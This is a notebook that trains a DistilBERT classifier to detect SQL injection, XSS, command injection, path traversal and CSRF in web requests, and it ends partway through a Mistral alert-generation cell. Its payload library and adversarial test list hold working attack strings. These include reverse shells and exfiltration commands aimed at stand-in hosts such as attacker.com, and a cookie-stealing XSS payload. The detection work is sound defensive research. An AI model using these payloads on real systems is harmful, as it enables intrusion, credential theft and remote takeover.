# IDRS PART 5: LLM-Powered Web Threat Analyser
## DistilBERT Fine-Tuning · SQLi · XSS · CSRF · Mistral Alert Generation

**All models used are FREE — no paid API keys required.**

**Scope:**
- DistilBERT fine-tuned on 6-class web threat taxonomy
- Two-phase training: head-only freeze then full fine-tuning
- Adversarial payload stress tests (obfuscated, encoded, mixed-case)
- Mistral-7B alert explanation via HuggingFace free Inference API
- ONNX export for fast production inference

**Datasets (place in data/ folder):**
- SQLi: https://www.kaggle.com/datasets/sajid576/sql-injection-dataset → data/sqli/
- XSS:  https://www.kaggle.com/datasets/syedsaqlainhussain/cross-site-scripting-xss-dataset-for-deep-learning → data/xss/

## CELL 1 — Imports & Config

In [ ]:
import os, sys, json, warnings, logging, time, re, base64
from pathlib import Path
from typing  import Dict, List, Tuple, Optional, Any
from copy    import deepcopy

import numpy  as np
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns

from sklearn.model_selection import train_test_split
from sklearn.metrics import (
    classification_report, confusion_matrix, f1_score,
    accuracy_score, average_precision_score,
    roc_auc_score, label_binarize, precision_recall_curve, roc_curve
)
from sklearn.utils.class_weight import compute_class_weight

import torch
from transformers import (
    AutoTokenizer, AutoModelForSequenceClassification,
    TrainingArguments, Trainer, DataCollatorWithPadding,
    EarlyStoppingCallback, pipeline, set_seed,
)
from datasets import Dataset, DatasetDict
import evaluate
import requests

warnings.filterwarnings('ignore')
SEED = 42
set_seed(SEED)
np.random.seed(SEED)
torch.manual_seed(SEED)

DEVICE = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
print(f'Device: {DEVICE}')

BASE_DIR   = Path('.')
OUTPUT_DIR = BASE_DIR / 'outputs'
MODEL_DIR  = BASE_DIR / 'models'
LLM_DIR    = MODEL_DIR / 'web_threat_classifier'
DATA_DIR   = BASE_DIR / 'data'
LOG_DIR    = BASE_DIR / 'logs'
for d in [OUTPUT_DIR, MODEL_DIR, LLM_DIR, DATA_DIR/'sqli', DATA_DIR/'xss', LOG_DIR]:
    d.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR/'idrs_part5.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('IDRS-P5')

plt.rcParams.update({
    'figure.facecolor':'white','axes.facecolor':'#f8f9fa',
    'axes.grid':True,'grid.alpha':0.4,'font.size':11,
    'axes.titlesize':13,'figure.dpi':120,
})

# 6-class web threat taxonomy
WEB_LABELS    = ['BENIGN','SQLi','XSS','CommandInjection','PathTraversal','CSRF']
N_WEB_CLASSES = len(WEB_LABELS)
LABEL2ID      = {l: i for i, l in enumerate(WEB_LABELS)}
ID2LABEL      = {i: l for l, i in LABEL2ID.items()}

PALETTE_WEB = {
    'BENIGN':'#2ecc71','SQLi':'#e74c3c','XSS':'#9b59b6',
    'CommandInjection':'#e67e22','PathTraversal':'#3498db','CSRF':'#1abc9c'
}

print(f'Web threat classes ({N_WEB_CLASSES}): {WEB_LABELS}')

## CELL 2 — Curated Payload Library & Dataset Construction

In [ ]:
# ============================================================
# Curated expert payload library covering all 6 threat classes.
# Augmented with synthetic variants for diversity.
# Real datasets loaded if present in data/sqli/ and data/xss/
# ============================================================

PAYLOAD_LIBRARY = {
    'BENIGN': [
        "SELECT * FROM courses WHERE id=5",
        "GET /student/profile?id=1042",
        "username=ahmed&password=securepass",
        "search=machine+learning+course",
        "page=1&limit=20&sort=name",
        "file=lecture_notes.pdf",
        "GET /api/grades?student_id=2245&semester=S2",
        "lang=fr&theme=dark&notifications=true",
        "email=student@univ.tn&token=abc123",
        "name=Ali+Ben+Salem&dept=informatique",
        "GET /course/register?code=INF3021&year=3",
        "report=grades&start=2024-01-01&end=2024-06-30",
        "GET /exam/schedule?date=2024-05-15",
        "POST /assignment/submit topic=AI_report",
        "GET /library/search?query=algorithms&limit=10",
        "filter=active&role=student&faculty=sciences",
        "id=382&action=view&format=json",
        "q=database+design+exam+2024",
        "upload=resume.pdf&category=application",
        "callback=results&session=xyz9012",
    ],
    'SQLi': [
        "' OR '1'='1",
        "1; DROP TABLE students;--",
        "' UNION SELECT username,password FROM users--",
        "admin'--",
        "1' AND SLEEP(5)--",
        "' OR 1=1#",
        "id=1 AND 1=2 UNION SELECT null,table_name FROM information_schema.tables--",
        "'; INSERT INTO admins VALUES('hacker','hacked');--",
        "1 OR 1=1 LIMIT 1 OFFSET 1--",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "%27%20OR%20%271%27%3D%271",
        "1; EXEC xp_cmdshell('whoami')--",
        "' WAITFOR DELAY '0:0:5'--",
        "id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "' OR 'x'='x",
        "1 UNION ALL SELECT NULL,NULL,NULL--",
        "admin' OR '1'='1'--",
        "' AND SUBSTRING(password,1,1)='a'--",
        "1;UPDATE users SET password='hacked' WHERE 1=1--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "1' ORDER BY 3--",
        "1 AND (SELECT LOAD_FILE('/etc/passwd'))--",
        "' HAVING 1=1--",
        "' UnIoN SeLeCt username,password FrOm users--",
        "'/**/OR/**/1=1--",
    ],
    'XSS': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        "<body onload=alert('xss')>",
        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        "<input onfocus=alert(1) autofocus>",
        "<img src='x' onerror='fetch(\"http://evil.com/\"+document.cookie)'>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=confirm(1)>",
        "<video src=1 onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<style>@import 'javascript:alert(1)'</style>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<ScRiPt>alert(document.cookie)</sCrIpT>",
        "<img/src=x/onerror=alert(1)>",
        "<scr%00ipt>alert(1)</scr%00ipt>",
        "<svg/onload=alert(1)>",
        "<noscript><p title=\"></noscript><img src=x onerror=alert(1)>",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "<button onclick=alert(document.domain)>Click</button>",
        "<link rel=stylesheet href=javascript:alert(1)>",
        "<table background=javascript:alert(1)>",
    ],
    'CommandInjection': [
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(uname -a)",
        "; wget http://evil.com/shell.sh -O /tmp/s && bash /tmp/s",
        "| nc -e /bin/bash attacker.com 4444",
        "; curl http://attacker.com/$(cat /etc/passwd | base64)",
        "; ping -c 1 attacker.com",
        "| find / -name *.conf 2>/dev/null",
        "; cat /proc/version",
        "| bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "; python -c 'import os;os.system(\"id\")'",
        "| awk '{print $1}' /etc/shadow",
        "; chmod 777 /etc/passwd",
        "%3B+ls+-la",
        "127.0.0.1;id",
        "||id",
        "localhost|id",
        "$(curl -s http://attacker.com/payload)",
        "&& env",
        "; crontab -l",
        "&& nmap -sV localhost",
        "&& tar cf /tmp/data.tar /home/",
        "127.0.0.1%7Cid",
    ],
    'PathTraversal': [
        "../../../etc/passwd",
        "..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "file=../../../etc/shadow",
        "php://filter/convert.base64-encode/resource=../config.php",
        "file:///etc/passwd",
        "../../../proc/self/environ",
        "/../../../../../../../../etc/passwd%00",
        "../../../../../../../../../../etc/passwd%00.jpg",
        "/etc/passwd%00",
        "../../../app/config/database.yml",
        "../../../.env",
        "../../config/secrets.yml",
        "..%c0%af..%c0%afetc%c0%afpasswd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "file=../../logs/auth.log",
        "../../../var/log/apache2/access.log",
        "../../../../../../windows/win.ini",
        "....///....///etc/passwd",
        "..%u2215..%u2215etc/passwd",
        "%5c%5c..%5c..%5c..%5cwindows%5csystem32%5cconfig%5cSAM",
        "../../../var/www/../../etc/passwd",
        "..\\\\..\\\\..\\\\boot.ini",
    ],
    'CSRF': [
        "POST /password/change HTTP/1.1\nOrigin: https://evil.com\n\nnew_password=hacked",
        "GET /api/transfer?to=attacker&amount=1000 HTTP/1.1\nCookie: session=victim",
        "fetch('https://univ.tn/api/grade/update',{method:'POST',credentials:'include'})",
        "POST /change-email HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nnew_email=attacker@evil.com",
        "GET /exam/submit?student_id=456&answers=all_wrong HTTP/1.1\nReferer: https://evil.com",
        "POST /api/enroll HTTP/1.1\nOrigin: https://evil.com\n\ncourse_id=admin_only",
        "GET /api/admin/users?action=delete_all HTTP/1.1\nCookie: admin=forged",
        "navigator.sendBeacon('https://univ.tn/api/grade',new Blob(['action=delete']))",
        "GET /admin/approve?id=999 HTTP/1.1\nReferer: https://phishing.com",
        "POST /account/delete HTTP/1.1\nCookie: session=stolen_token",
        "XMLHttpRequest open DELETE https://univ.tn/api/record/123",
        "window.location='https://univ.tn/sso/auth?redirect=http://evil.com'",
        "GET /settings?email=attacker@evil.com HTTP/1.1\nCookie: auth=valid",
        "POST /admin/create_user HTTP/1.1\nOrigin: null\n\nuser=evil&role=admin",
        "GET /api/grade/set?student=123&grade=F HTTP/1.1\nReferer: https://evil.com",
        "history.pushState({},'','//univ.tn/admin')",
        "POST /change-role HTTP/1.1\nSameSite: None\n\nrole=administrator",
        "GET /logout HTTP/1.1\nCookie: session=victim&X-CSRF: missing",
        "fetch('/api/unenroll?course=all',{credentials:'include',method:'GET'})",
        "POST /exam/grade HTTP/1.1\nX-Forwarded-For: legitimate.edu\n\ngrade=A",
    ],
}

def try_load_real_data(path: Path, label_name: str) -> List[Dict]:
    rows = []
    for f in path.glob('*.csv'):
        try:
            df = pd.read_csv(f, nrows=3000, low_memory=False)
            str_cols = df.select_dtypes(include='object').columns
            if not len(str_cols): continue
            text_col = str_cols[0]
            for _, row in df.iterrows():
                rows.append({'text': str(row[text_col]), 'label': LABEL2ID[label_name]})
            logger.info('Loaded %d rows from %s', len(df), f.name)
        except Exception as e:
            logger.warning('Load error %s: %s', f.name, e)
    return rows

real_sqli = try_load_real_data(DATA_DIR/'sqli', 'SQLi')
real_xss  = try_load_real_data(DATA_DIR/'xss',  'XSS')
print(f'Real data — SQLi: {len(real_sqli)}  XSS: {len(real_xss)}')

rng = np.random.default_rng(SEED)
all_rows = list(real_sqli) + list(real_xss)
covered  = set()
if real_sqli: covered.add('SQLi')
if real_xss:  covered.add('XSS')

AUGMENT_N = 600
for label_name, payloads in PAYLOAD_LIBRARY.items():
    n_add = AUGMENT_N if label_name not in covered else 150
    for _ in range(n_add):
        base = payloads[int(rng.integers(0, len(payloads)))]
        aug  = rng.integers(0, 5)
        if   aug == 0: text = f'param={base}'
        elif aug == 1: text = f'GET /search?q={base} HTTP/1.1'
        elif aug == 2: text = f'POST /api HTTP/1.1\n\nbody={base}'
        else:          text = base
        all_rows.append({'text': text, 'label': LABEL2ID[label_name]})

rng.shuffle(all_rows)
df_web = pd.DataFrame(all_rows)
df_web['text']  = df_web['text'].astype(str)
df_web['label'] = df_web['label'].astype(int)

print(f'\nTotal web payload dataset: {len(df_web):,} samples')
for cls_id, cls_name in ID2LABEL.items():
    n = (df_web['label']==cls_id).sum()
    print(f'  {cls_name:<20} {n:>5,}')

## CELL 3 — Tokenisation & HuggingFace Dataset Pipeline

In [ ]:
MODEL_CHECKPOINT = 'distilbert-base-uncased'
MAX_LEN          = 128

print(f'Loading tokeniser: {MODEL_CHECKPOINT}')
tokeniser = AutoTokenizer.from_pretrained(MODEL_CHECKPOINT)

X_texts  = df_web['text'].tolist()
y_labels = df_web['label'].tolist()

X_tr, X_tmp, y_tr, y_tmp = train_test_split(
    X_texts, y_labels, test_size=0.25, stratify=y_labels, random_state=SEED)
X_val_txt, X_te, y_val_lbl, y_te = train_test_split(
    X_tmp, y_tmp, test_size=0.4, stratify=y_tmp, random_state=SEED)

print(f'Train: {len(X_tr):,}  Val: {len(X_val_txt):,}  Test: {len(X_te):,}')

def make_hf_dataset(texts, labels):
    return Dataset.from_dict({'text': texts, 'label': labels})

raw_datasets = DatasetDict({
    'train': make_hf_dataset(X_tr,      y_tr),
    'val'  : make_hf_dataset(X_val_txt, y_val_lbl),
    'test' : make_hf_dataset(X_te,      y_te),
})

def tokenise_batch(batch):
    return tokeniser(batch['text'], truncation=True, max_length=MAX_LEN, padding=False)

print('Tokenising...')
tokenised_datasets = raw_datasets.map(
    tokenise_batch, batched=True, batch_size=256, remove_columns=['text'])
tokenised_datasets.set_format('torch')

data_collator = DataCollatorWithPadding(tokenizer=tokeniser, return_tensors='pt')

sample_lens = [
    len(tokeniser(t, truncation=True, max_length=MAX_LEN)['input_ids'])
    for t in X_tr[:400]
]
print(f'Token length — mean: {np.mean(sample_lens):.1f}  P95: {np.percentile(sample_lens,95):.0f}')
print('Tokenisation complete.')

## CELL 4 — Metrics, Class Weights & WeightedTrainer

In [ ]:
hf_accuracy = evaluate.load('accuracy')
hf_f1       = evaluate.load('f1')

def compute_metrics(eval_pred):
    logits, labels = eval_pred
    predictions    = np.argmax(logits, axis=-1)
    acc    = hf_accuracy.compute(predictions=predictions, references=labels)['accuracy']
    f1_mac = hf_f1.compute(predictions=predictions, references=labels, average='macro')['f1']
    f1_wgt = hf_f1.compute(predictions=predictions, references=labels, average='weighted')['f1']
    per_cls= f1_score(labels, predictions, average=None, zero_division=0)
    per_cls_dict = {f'f1_{ID2LABEL[i]}': float(v) for i,v in enumerate(per_cls)}
    return {'accuracy': acc, 'f1_macro': f1_mac, 'f1_weighted': f1_wgt, **per_cls_dict}

cw = compute_class_weight('balanced', classes=np.arange(N_WEB_CLASSES), y=y_tr)
CLASS_WEIGHTS = torch.tensor(cw, dtype=torch.float32).to(DEVICE)

print('Class weights:')
for cls, w in zip(WEB_LABELS, cw):
    print(f'  {cls:<20} {w:.4f}')

class WeightedTrainer(Trainer):
    """
    Subclass of HuggingFace Trainer that applies class-weighted
    cross-entropy loss to handle imbalanced web threat classes.
    Critical for detecting rare attack types like CSRF.
    """
    def compute_loss(self, model, inputs, return_outputs=False):
        labels  = inputs.pop('labels')
        outputs = model(**inputs)
        loss    = torch.nn.CrossEntropyLoss(weight=CLASS_WEIGHTS)(outputs.logits, labels)
        return (loss, outputs) if return_outputs else loss

print('WeightedTrainer ready.')

## CELL 5 — DistilBERT Two-Phase Fine-Tuning

In [ ]:
# ============================================================
# Two-phase training strategy:
#   Phase 1 (ep 1-2): Freeze transformer body → train head only
#     Advantage: fast head adaptation, no catastrophic forgetting
#   Phase 2 (ep 3+):  Unfreeze all → full end-to-end fine-tune
#     Advantage: richer representations for security payloads
# ============================================================

MODEL_CHECKPOINT = 'distilbert-base-uncased'
TRAIN_EPOCHS     = 6
BATCH_SIZE_TR    = 32 if torch.cuda.is_available() else 16
BATCH_SIZE_EVAL  = 64 if torch.cuda.is_available() else 32

print(f'Loading DistilBERT: {MODEL_CHECKPOINT}')
distilbert_model = AutoModelForSequenceClassification.from_pretrained(
    MODEL_CHECKPOINT, num_labels=N_WEB_CLASSES,
    id2label=ID2LABEL, label2id=LABEL2ID,
    ignore_mismatched_sizes=True,
)
distilbert_model.to(DEVICE)
print(f'Params: {sum(p.numel() for p in distilbert_model.parameters()):,}')

# --- Phase 1: freeze transformer body ---
print('\nPhase 1: Freezing transformer layers (head only)...')
for name, param in distilbert_model.named_parameters():
    if 'classifier' not in name and 'pre_classifier' not in name:
        param.requires_grad = False
trainable = sum(p.numel() for p in distilbert_model.parameters() if p.requires_grad)
print(f'Trainable params (Phase 1): {trainable:,}')

base_args = TrainingArguments(
    output_dir                  = str(LLM_DIR/'checkpoints'),
    num_train_epochs            = 2,
    per_device_train_batch_size = BATCH_SIZE_TR,
    per_device_eval_batch_size  = BATCH_SIZE_EVAL,
    learning_rate               = 3e-5,
    weight_decay                = 0.01,
    warmup_ratio                = 0.1,
    lr_scheduler_type           = 'cosine',
    evaluation_strategy         = 'epoch',
    save_strategy               = 'epoch',
    load_best_model_at_end      = True,
    metric_for_best_model       = 'f1_macro',
    greater_is_better           = True,
    logging_dir                 = str(LOG_DIR/'distilbert_logs'),
    logging_steps               = 20,
    fp16                        = torch.cuda.is_available(),
    dataloader_num_workers      = 0,
    seed                        = SEED,
    report_to                   = 'none',
    label_smoothing_factor      = 0.05,
)

trainer_p1 = WeightedTrainer(
    model=distilbert_model, args=base_args,
    train_dataset=tokenised_datasets['train'],
    eval_dataset=tokenised_datasets['val'],
    tokenizer=tokeniser, data_collator=data_collator,
    compute_metrics=compute_metrics,
    callbacks=[EarlyStoppingCallback(early_stopping_patience=2)],
)
print('\nPhase 1 Training...')
trainer_p1.train()
p1_val = trainer_p1.evaluate(tokenised_datasets['val'])
print(f'Phase 1 val F1-macro: {p1_val.get("eval_f1_macro",0):.4f}')

# --- Phase 2: unfreeze all ---
print('\nPhase 2: Unfreezing all layers...')
for param in distilbert_model.parameters():
    param.requires_grad = True
print(f'Trainable params (Phase 2): {sum(p.numel() for p in distilbert_model.parameters() if p.requires_grad):,}')

args_p2 = TrainingArguments(
    output_dir                  = str(LLM_DIR/'checkpoints_p2'),
    num_train_epochs            = TRAIN_EPOCHS,
    per_device_train_batch_size = BATCH_SIZE_TR,
    per_device_eval_batch_size  = BATCH_SIZE_EVAL,
    learning_rate               = 2e-5,
    weight_decay                = 0.01,
    warmup_ratio                = 0.06,
    lr_scheduler_type           = 'cosine',
    evaluation_strategy         = 'epoch',
    save_strategy               = 'epoch',
    load_best_model_at_end      = True,
    metric_for_best_model       = 'f1_macro',
    greater_is_better           = True,
    logging_dir                 = str(LOG_DIR/'distilbert_logs_p2'),
    logging_steps               = 20,
    fp16                        = torch.cuda.is_available(),
    dataloader_num_workers      = 0,
    seed                        = SEED,
    report_to                   = 'none',
    label_smoothing_factor      = 0.05,
)

trainer_p2 = WeightedTrainer(
    model=distilbert_model, args=args_p2,
    train_dataset=tokenised_datasets['train'],
    eval_dataset=tokenised_datasets['val'],
    tokenizer=tokeniser, data_collator=data_collator,
    compute_metrics=compute_metrics,
    callbacks=[EarlyStoppingCallback(early_stopping_patience=3)],
)
print(f'Phase 2 Training ({TRAIN_EPOCHS} epochs max)...')
trainer_p2.train()

distilbert_model.save_pretrained(str(LLM_DIR))
tokeniser.save_pretrained(str(LLM_DIR))
print(f'Saved: {LLM_DIR}')

## CELL 6 — Test Set Evaluation & Visualisation

In [ ]:
print('Evaluating on test set...')
test_preds    = trainer_p2.predict(tokenised_datasets['test'])
logits_test   = test_preds.predictions
y_pred_test   = np.argmax(logits_test, axis=-1)
y_true_test   = test_preds.label_ids
y_prob_test   = torch.softmax(torch.tensor(logits_test), dim=-1).numpy()

acc    = accuracy_score(y_true_test, y_pred_test)
f1_mac = f1_score(y_true_test, y_pred_test, average='macro',    zero_division=0)
f1_wgt = f1_score(y_true_test, y_pred_test, average='weighted', zero_division=0)
y_bin  = label_binarize(y_true_test, classes=list(range(N_WEB_CLASSES)))
try:
    roc_auc = roc_auc_score(y_bin, y_prob_test, average='macro', multi_class='ovr')
except:
    roc_auc = float('nan')
pr_aucs = [average_precision_score(y_bin[:,c], y_prob_test[:,c])
           for c in range(N_WEB_CLASSES) if y_bin[:,c].sum()>0]
pr_auc  = float(np.mean(pr_aucs))
per_cls_f1 = f1_score(y_true_test, y_pred_test, average=None, zero_division=0)

print(f'Accuracy: {acc:.4f}  F1-Macro: {f1_mac:.4f}  F1-Weighted: {f1_wgt:.4f}')
print(f'ROC-AUC: {roc_auc:.4f}  PR-AUC: {pr_auc:.4f}')
print(classification_report(y_true_test, y_pred_test, target_names=WEB_LABELS, zero_division=0))

fig, axes = plt.subplots(1, 3, figsize=(21, 6))

# Confusion matrix
ax = axes[0]
cm = confusion_matrix(y_true_test, y_pred_test, normalize='true')
sns.heatmap(cm, ax=ax, annot=True, fmt='.2f', xticklabels=WEB_LABELS,
            yticklabels=WEB_LABELS, cmap='Blues', vmin=0, vmax=1,
            linewidths=0.5, cbar_kws={'label':'Recall'}, annot_kws={'size':8,'fontweight':'bold'})
ax.set_title('Confusion Matrix\nDistilBERT Web Classifier', fontweight='bold')
ax.tick_params(axis='x', rotation=35, labelsize=8)
ax.tick_params(axis='y', rotation=0,  labelsize=8)

# Per-class F1
ax = axes[1]
colors = [PALETTE_WEB.get(c,'#95a5a6') for c in WEB_LABELS]
bars   = ax.bar(WEB_LABELS, per_cls_f1, color=colors, edgecolor='white', linewidth=0.8)
ax.axhline(f1_mac, color='black', lw=2, ls='--', label=f'Macro={f1_mac:.4f}')
ax.set_ylim(0, 1.15); ax.set_title('Per-Class F1 Score', fontweight='bold')
ax.tick_params(axis='x', rotation=30); ax.legend(fontsize=9)
for bar, v in zip(bars, per_cls_f1):
    ax.text(bar.get_x()+bar.get_width()/2, v+0.02, f'{v:.3f}',
            ha='center', fontsize=8, fontweight='bold')

# ROC curves
ax = axes[2]
for c in range(N_WEB_CLASSES):
    if y_bin[:,c].sum()==0: continue
    fpr_c,tpr_c,_ = roc_curve(y_bin[:,c], y_prob_test[:,c])
    auc_c = roc_auc_score(y_bin[:,c], y_prob_test[:,c])
    ax.plot(fpr_c, tpr_c, lw=1.8, color=PALETTE_WEB.get(WEB_LABELS[c],'#95a5a6'),
            label=f'{WEB_LABELS[c]} ({auc_c:.3f})')
ax.plot([0,1],[0,1],'k--',lw=1,alpha=0.4)
ax.set_xlabel('FPR'); ax.set_ylabel('TPR')
ax.set_title('ROC Curves per Class', fontweight='bold')
ax.legend(fontsize=7)

plt.suptitle(f'DistilBERT Web Threat Classifier — F1={f1_mac:.4f} AUC={roc_auc:.4f}',
             fontsize=12, fontweight='bold')
plt.tight_layout()
plt.savefig(OUTPUT_DIR/'distilbert_eval.png', bbox_inches='tight', dpi=150)
plt.show()
print('Saved: outputs/distilbert_eval.png')

distilbert_metrics = {
    'accuracy':round(acc,4),'f1_macro':round(f1_mac,4),
    'f1_weighted':round(f1_wgt,4),'roc_auc':round(roc_auc,4),'pr_auc':round(pr_auc,4),
    'per_class_f1':{WEB_LABELS[i]:round(float(v),4) for i,v in enumerate(per_cls_f1)},
}

## CELL 7 — Adversarial Payload Stress Tests

In [ ]:
# ============================================================
# Adversarial obfuscation techniques tested:
#   1. URL encoding         (%27 = ')
#   2. Double encoding      (%2527 = %27 = ')
#   3. Mixed-case keywords  (SeLeCt, UnIoN)
#   4. Comment injection    (/**/ between SQL keywords)
#   5. Unicode substitution (\u003c = <)
#   6. Null-byte injection  (%00)
#   7. HTML entity encoding (&lt; &gt;)
#   8. Base64 embedding
# ============================================================

b64_xss = base64.b64encode(b'<script>alert(1)</script>').decode()

ADVERSARIAL_PAYLOADS = [
    ('SQLi','URL-encoded',       "%27%20OR%20%271%27%3D%271"),
    ('SQLi','Double-encoded',    "%2527%2520OR%2520%25271%2527%253D%25271"),
    ('SQLi','Mixed-case',        "' UnIoN SeLeCt username,password FrOm users--"),
    ('SQLi','Comment-separated', "'/**/OR/**/1=1--"),
    ('SQLi','Hex-encoded',       "1 AND 0x313D31--"),
    ('SQLi','Scientific notation',"1e0 UNION SELECT null,null--"),
    ('SQLi','MSSQL CHAR',        "1;EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116))"),
    ('XSS', 'HTML entity',       "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ('XSS', 'Unicode',           "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
    ('XSS', 'Mixed-case',        "<ScRiPt>alert(document.cookie)</sCrIpT>"),
    ('XSS', 'Slash-separated',   "<img/src=x/onerror=alert(1)>"),
    ('XSS', 'Null-byte',         "<scr%00ipt>alert(1)</scr%00ipt>"),
    ('XSS', 'Base64',            f"<a href='data:text/html;base64,{b64_xss}'>click</a>"),
    ('XSS', 'SVG unicode',       "<svg/onload=\\u0061\\u006c\\u0065\\u0072\\u0074(1)>"),
    ('CommandInjection','Backtick',   "filename=`cat /etc/passwd`"),
    ('CommandInjection','Dollar-paren',"host=$(id)"),
    ('CommandInjection','Pipe URL-enc',"127.0.0.1%7Cid"),
    ('CommandInjection','Semicolon URL',"localhost%3Bid"),
    ('PathTraversal','Unicode traversal',"..%c0%af..%c0%afetc%c0%afpasswd"),
    ('PathTraversal','Double-slash',    "....//....//....//etc/passwd"),
    ('PathTraversal','Null-byte JPG',   "../../../etc/passwd%00.jpg"),
    ('PathTraversal','Windows-style',   "..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe"),
    ('CSRF','Origin forged',     "POST /password/change HTTP/1.1\nOrigin: https://evil.com\n\nnew_password=hacked"),
    ('CSRF','sendBeacon',        "navigator.sendBeacon('https://univ.tn/api/grade',new Blob(['action=delete']))"),
    ('BENIGN','Normal search',   "search=introduction+to+machine+learning"),
    ('BENIGN','Normal login',    "username=student123&password=mypassword!"),
    ('BENIGN','Normal file',     "file=lecture_week3.pdf&course=INF201"),
]

clf_pipeline = pipeline(
    'text-classification', model=distilbert_model, tokenizer=tokeniser,
    device=0 if torch.cuda.is_available() else -1, top_k=None,
)

print('Adversarial Payload Stress Test\n')
print(f'  {"True":>18} {"Predicted":>18} {"Conf":>6} {"OK":>3}  Description')
print('  '+'-'*80)

adv_results = []
for true_cls, desc, payload in ADVERSARIAL_PAYLOADS:
    preds    = clf_pipeline(payload[:512])[0]
    best     = max(preds, key=lambda x: x['score'])
    pred_cls = best['label']
    conf     = best['score']
    correct  = (pred_cls == true_cls)
    icon     = 'OK' if correct else 'XX'
    print(f'  {true_cls:>18} {pred_cls:>18} {conf:>6.3f} {icon:>3}  [{desc}]')
    adv_results.append({'true':true_cls,'pred':pred_cls,'conf':round(conf,4),'correct':correct,'desc':desc})

adv_df      = pd.DataFrame(adv_results)
overall_acc = adv_df['correct'].mean()
attack_acc  = adv_df[adv_df['true']!='BENIGN']['correct'].mean()
benign_acc  = adv_df[adv_df['true']=='BENIGN']['correct'].mean()

print(f'\nOverall accuracy  : {overall_acc:.3f}')
print(f'Attack detect rate: {attack_acc:.3f}')
print(f'Benign accuracy   : {benign_acc:.3f}')

adv_df.to_csv(OUTPUT_DIR/'adversarial_results.csv', index=False)

fig, axes = plt.subplots(1,2,figsize=(14,5))
per_cls_adv = adv_df.groupby('true')['correct'].mean().reindex(WEB_LABELS).fillna(0)
colors = ['#2ecc71' if v>0.7 else ('#f39c12' if v>0.4 else '#e74c3c')
          for v in per_cls_adv.values]
axes[0].bar(per_cls_adv.index, per_cls_adv.values, color=colors, edgecolor='white')
axes[0].axhline(overall_acc, color='black', lw=2, ls='--', label=f'Overall={overall_acc:.2f}')
axes[0].set_ylim(0,1.15); axes[0].legend(); axes[0].set_title('Adversarial Detection Rate', fontweight='bold')
axes[0].tick_params(axis='x', rotation=30)

axes[1].hist(adv_df[adv_df['correct']]['conf'].values, bins=12, alpha=0.7,
             color='#2ecc71', label=f'Correct ({adv_df["correct"].sum()})')
axes[1].hist(adv_df[~adv_df['correct']]['conf'].values, bins=12, alpha=0.7,
             color='#e74c3c', label=f'Wrong ({(~adv_df["correct"]).sum()})')
axes[1].set_xlabel('Confidence'); axes[1].set_ylabel('Count')
axes[1].set_title('Confidence Distribution', fontweight='bold')
axes[1].legend()
plt.suptitle(f'Adversarial Robustness — {len(ADVERSARIAL_PAYLOADS)} payloads | Overall={overall_acc:.3f}',
             fontsize=11, fontweight='bold')
plt.tight_layout()
plt.savefig(OUTPUT_DIR/'adversarial_dashboard.png', bbox_inches='tight', dpi=150)
plt.show()
print('Saved: outputs/adversarial_dashboard.png')

## CELL 8 — Mistral-7B Alert Generation (Free HF Inference API)

In [ ]:
# ============================================================
# Primary  : Mistral-7B-Instruct via HuggingFace Inference API
#             Free tier — no API key required for light use
#             Optional: add HF token for higher rate limits
# Fallback : Rule-based structured alert (offline / rate-limited)
#
# Transforms a raw detection into a human-readable IT report
# a university security team can act on immediately.
# ============================================================

HF_API_URL = 'https://api-inference.huggingface.co/models/mistralai/Mistral-7B-Instruct-v0.2'
HF_HEADERS  = {'Content-Type': 'application/json'}
# Uncomment and paste your free HF token for higher rate limits:
# HF_HEADERS['Authorization'] = 'Bearer hf_YOUR_TOKEN_HERE'

def build_alert_prompt(payload, threat_class, confidence, source_ip, target_url):
    return (
        f"<s>[INST]\n"
        f"You are an expert cybersecurity analyst for a Tunisian university IT team.\n"
        f"A web attack was detected. Write a concise actionable security report.\n\n"
        f"DETECTION:\n"
        f"- Threat: {threat_class} (confidence: {confidence:.1%})\n"
        f"- Source IP: {source_ip}\n"
        f"- Target: {target_url}\n"
        f"- Payload: {payload[:200]}\n"
        f"- Time: {time.strftime('%Y-%m-%d %H:%M UTC')}\n\n"
        f"Write exactly:\n"
        f"1. THREAT SUMMARY (1 sentence)\n"
        f"2. TECHNICAL EXPLANATION (2-3 sentences)\n"
        f"3. IMMEDIATE ACTION (specific step)\n"
        f"4. RISK LEVEL (Critical/High/Medium/Low + reason)\n"
        f"Keep under 180 words.[/INST]"
    )

def generate_alert_mistral(prompt, max_tokens=250, timeout=25):
    try:
        resp = requests.post(HF_API_URL, headers=HF_HEADERS, timeout=timeout,
            json={'inputs': prompt,
                  'parameters':{'max_new_tokens':max_tokens,'temperature':0.3,
                                'top_p':0.9,'do_sample':True,'return_full_text':False}})
        if resp.status_code == 200:
            result = resp.json()
            if isinstance(result, list) and result:
                return result[0].get('generated_text','').strip()
